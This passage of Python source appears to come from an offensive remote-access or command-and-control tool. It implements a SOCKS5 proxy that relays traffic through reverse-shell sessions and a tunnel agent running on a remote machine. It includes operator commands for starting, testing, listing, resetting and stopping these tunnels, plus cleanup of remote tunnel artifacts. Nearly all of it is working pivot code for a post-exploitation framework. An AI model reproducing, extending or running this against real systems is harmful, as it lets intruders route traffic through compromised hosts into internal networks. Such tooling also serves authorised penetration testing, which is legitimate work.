            self._log(client_sock, f"SOCKS test FAIL: {host}:{port} — {err}")
        return True

    def _recv_exact(self, sock, n, timeout=10.0):
        data = b''
        end = time.time() + timeout
        while len(data) < n and time.time() < end:
            try:
                chunk = sock.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                continue
            except OSError:
                return None
        return data if len(data) == n else None

    def _relay_reader(self, conn, send_queue, stop):
        """Read from the local SOCKS client with backpressure via a bounded queue."""
        while not stop.is_set():
            try:
                r, _, _ = select.select([conn], [], [], 0.1)
                if not r:
                    continue
                data = conn.recv(RELAY_CHUNK)
                if not data:
                    stop.set()
                    break
                while not stop.is_set():
                    try:
                        send_queue.put(data, timeout=0.5)
                        break
                    except queue.Full:
                        continue
            except OSError:
                stop.set()
                break
        stop.set()

    def _relay_upload(self, client_sock, up_conn, sid, send_queue, stop):
        """Drain the upload queue to the tunnel agent."""
        while not stop.is_set() and client_sock in self.h.revshell_clients and self._conn_alive(up_conn):
            try:
                data = send_queue.get(timeout=0.5)
            except queue.Empty:
                continue
            if data is None:
                break
            ok, hard_fail = self._send_bulk(up_conn, sid, data)
            if not ok:
                if hard_fail:
                    self._remove_conn(client_sock, up_conn)
                    stop.set()
                break
        stop.set()

    def _relay_download(self, client_sock, down_conn, sid, conn, stop):
        idle_rounds = 0
        had_data = False
        while not stop.is_set() and client_sock in self.h.revshell_clients and self._conn_alive(down_conn):
            data, closed, hard_fail = self._recv_bulk(
                down_conn, sid, RELAY_CHUNK,
                timeout=RELAY_ACTIVE_TIMEOUT if had_data else RELAY_IDLE_TIMEOUT,
            )
            if hard_fail:
                self._remove_conn(client_sock, down_conn)
                stop.set()
                break
            if data:
                try:
                    conn.sendall(data)
                except OSError:
                    stop.set()
                    break
                idle_rounds = 0
                had_data = True
            else:
                idle_rounds += 1
                if idle_rounds > MAX_IDLE_ROUNDS:
                    stop.set()
                    break
            if closed:
                stop.set()
                break
        stop.set()

    def _relay_single(self, client_sock, tunnel_conn, sid, conn):
        stop = threading.Event()
        send_queue = queue.Queue(maxsize=UPLOAD_QUEUE_SIZE)
        threads = [
            threading.Thread(
                target=self._relay_reader, args=(conn, send_queue, stop), daemon=True,
            ),
            threading.Thread(
                target=self._relay_upload,
                args=(client_sock, tunnel_conn, sid, send_queue, stop),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_download,
                args=(client_sock, tunnel_conn, sid, conn, stop),
                daemon=True,
            ),
        ]
        self._inc_channel_load(tunnel_conn, 2)
        try:
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
        finally:
            self._inc_channel_load(tunnel_conn, -2)
            while True:
                try:
                    send_queue.get_nowait()
                except queue.Empty:
                    break
            self._close_stream_on_agent(client_sock, sid, preferred=tunnel_conn)

    def _relay(self, client_sock, up_conn, down_conn, sid, conn):
        """Full-duplex bulk relay; falls back to single-channel mode when needed."""
        if up_conn is down_conn:
            self._relay_single(client_sock, up_conn, sid, conn)
            return

        stop = threading.Event()
        send_queue = queue.Queue(maxsize=UPLOAD_QUEUE_SIZE)
        self._inc_channel_load(up_conn, 1)
        self._inc_channel_load(down_conn, 1)
        threads = [
            threading.Thread(
                target=self._relay_reader, args=(conn, send_queue, stop), daemon=True,
            ),
            threading.Thread(
                target=self._relay_upload,
                args=(client_sock, up_conn, sid, send_queue, stop),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_download,
                args=(client_sock, down_conn, sid, conn, stop),
                daemon=True,
            ),
        ]
        try:
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
        finally:
            self._inc_channel_load(up_conn, -1)
            self._inc_channel_load(down_conn, -1)
            while True:
                try:
                    send_queue.get_nowait()
                except queue.Empty:
                    break
            preferred = up_conn if self._conn_alive(up_conn) else down_conn
            self._close_stream_on_agent(client_sock, sid, preferred=preferred)

    def _conn_alive(self, conn):
        try:
            return conn.fileno() != -1
        except OSError:
            return False

    def _handle_socks_client(self, client_sock, conn):
        sid = None
        tunnel_conn = None
        try:
            conn.settimeout(15.0)
            greeting = self._recv_exact(conn, 2)
            if not greeting or greeting[0] != 0x05:
                return
            if not self._recv_exact(conn, greeting[1]):
                return
            conn.sendall(b'\x05\x00')

            req = self._recv_exact(conn, 4)
            if not req or req[0] != 0x05 or req[1] != 0x01:
                return
            atyp = req[3]
            if atyp == 0x01:
                b = self._recv_exact(conn, 4)
                host = socket.inet_ntoa(b) if b else None
            elif atyp == 0x03:
                ln = self._recv_exact(conn, 1)
                b = self._recv_exact(conn, ln[0]) if ln else None
                host = b.decode('utf-8', errors='ignore') if b else None
            elif atyp == 0x04:
                b = self._recv_exact(conn, 16)
                host = socket.inet_ntop(socket.AF_INET6, b) if b else None
            else:
                conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                return
            pb = self._recv_exact(conn, 2)
            if not pb or not host:
                return
            port = struct.unpack('!H', pb)[0]

            sid = self._next_stream_id(client_sock)
            tunnel_conn = self._pick_channel(client_sock)
            resp = None
            for _ in range(TUNNEL_POOL_SIZE + 1):
                if not tunnel_conn:
                    break
                resp, tunnel_conn = self._channel_request(
                    client_sock,
                    {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
                    timeout=45.0,
                    preferred=tunnel_conn,
                )
                if resp and resp.get('ok'):
                    break
                tunnel_conn = self._pick_channel(client_sock)

            if not resp or not resp.get('ok'):
                err = (resp or {}).get('error', self._last_error or 'no response')
                self._log(client_sock, f"SOCKS connect {host}:{port} failed: {err}")
                conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                return

            conn.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + struct.pack('!H', 0))
            conn.setblocking(False)
            up_conn, down_conn = self._pick_two_channels(client_sock)
            if not up_conn:
                up_conn = tunnel_conn
                down_conn = tunnel_conn
            self._relay(client_sock, up_conn, down_conn, sid, conn)
        except Exception:
            pass
        finally:
            if sid is not None:
                self._close_stream_on_agent(client_sock, sid, preferred=tunnel_conn)
            try:
                conn.close()
            except OSError:
                pass

    def _stop_proxy(self, proxy_id, reason='operator request', cleanup_remote=True):
        with self._lock:
            proxy = self._proxies.pop(proxy_id, None)
        if not proxy:
            return False
        proxy['stop_event'].set()
        try:
            proxy['listener'].close()
        except OSError:
            pass
        cs = proxy.get('client_sock')
        print(f"{self.h.colors['yellow']}SOCKS5 {proxy_id} stopped ({reason}){self.h.colors['end']}")
        if cs and cleanup_remote and not any(p.get('client_sock') == cs for p in self._proxies.values()):
            self._cleanup_remote_tunnel_artifacts(cs, reason=reason)
        return True

    def list_tunnels(self):
        proxies = list(self._proxies.values())
        if not proxies:
            print(f"{self.h.colors['yellow']}No active SOCKS proxies{self.h.colors['end']}")
            return
        print(f"{self.h.colors['green']}SOCKS5 proxies:{self.h.colors['end']}")
        for p in proxies:
            alive = p['client_sock'] in self.h.revshell_clients
            n = len(self._alive_conns(p['client_sock']))
            print(f"  {p['id']} #{p['session_id']} 127.0.0.1:{p['listen_port']} [{n}/{TUNNEL_POOL_SIZE} ch, {'up' if alive else 'orphan'}]")

    def handle_command(self, client_sock, cmd_parts, from_client=False):
        if not cmd_parts:
            return False
        cmd = cmd_parts[0].lower()

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'reset':
            return self._socks_reset(client_sock)

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'test':
            if len(cmd_parts) < 4:
                print(f"{self.h.colors['red']}Usage: socks test <host> <port>{self.h.colors['end']}")
                return True
            return self._socks_test(client_sock, cmd_parts[2], cmd_parts[3])

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'stop':
            if self._stop_proxy(cmd_parts[2] if len(cmd_parts) > 2 else ''):
                return True
            print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
            return True

        if cmd == 'socks':
            if from_client:
                if len(cmd_parts) < 2:
                    print(f"{self.h.colors['red']}Usage: socks <listen_port>{self.h.colors['end']}")
                    print(f"{self.h.colors['cyan']}       socks test <host> <port>{self.h.colors['end']}")
                    print(f"{self.h.colors['cyan']}       socks reset{self.h.colors['end']}")
                    print(f"{self.h.colors['cyan']}       socks stop <proxy_id>{self.h.colors['end']}")
                    return True
                port = cmd_parts[1]
            else:
                port = cmd_parts[2] if len(cmd_parts) > 2 else None
                if not port:
                    print(
                        f"{self.h.colors['red']}Usage: socks <session_id> <listen_port> | "
                        f"socks <session_id> test <host> <port> | "
                        f"socks <session_id> reset{self.h.colors['end']}"
                    )
                    return True
            self.start_socks(client_sock, port)
            return True

        if cmd == 'tunnels':
            self.list_tunnels()
            return True
        return False

    def handle_main_command(self, cmd_parts):
        if not cmd_parts:
            return False
        cmd = cmd_parts[0].lower()
        if cmd == 'tunnels':
            self.list_tunnels()
            return True
        if cmd == 'socks' and len(cmd_parts) >= 3 and cmd_parts[1].lower() == 'stop':
            if self._stop_proxy(cmd_parts[2]):
                return True
            print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
            return True
        if cmd == 'socks' and len(cmd_parts) >= 4 and cmd_parts[2].lower() == 'reset':
            try:
                session_id = int(cmd_parts[1])
            except ValueError:
                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                return True
            cs = self.h._get_client_by_id(session_id)
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            return self._socks_reset(cs)
        if cmd == 'socks' and len(cmd_parts) >= 5 and cmd_parts[2].lower() == 'test':
            try:
                session_id = int(cmd_parts[1])
            except ValueError:
                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                return True
            cs = self.h._get_client_by_id(session_id)
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            return self._socks_test(cs, cmd_parts[3], cmd_parts[4])
        if cmd == 'socks':
            if len(cmd_parts) < 3:
                print(
                    f"{self.h.colors['red']}Usage: socks <session_id> <listen_port> | "
                    f"socks <session_id> test <host> <port> | "
                    f"socks <session_id> reset | "
                    f"socks stop <proxy_id>{self.h.colors['end']}"
                )
                return True
            cs = self.h._get_client_by_id(int(cmd_parts[1]))
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            return self.handle_command(cs, cmd_parts, from_client=False)
        return False
